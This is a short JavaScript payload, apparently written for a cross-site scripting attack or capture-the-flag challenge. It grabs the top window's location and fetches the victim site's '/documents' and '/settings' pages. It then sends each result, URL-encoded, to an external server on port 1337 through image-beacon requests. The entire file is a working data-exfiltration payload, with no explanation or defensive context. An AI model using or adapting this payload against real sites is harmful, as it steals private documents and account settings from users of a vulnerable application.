d=window.top.document;
w=window.top;
function sendData(data, what='xxx'){
(new Image()).src=`http://terjanq.cf:1337/?${what}${encodeURIComponent(data)}`;
}
sendData(w.location.href, 'location=');
fetch('/documents').then(e=>e.text()).then(e=>sendData(e, 'documents'));
fetch('/settings').then(e=>e.text()).then(e=>sendData(e, 'settings'));
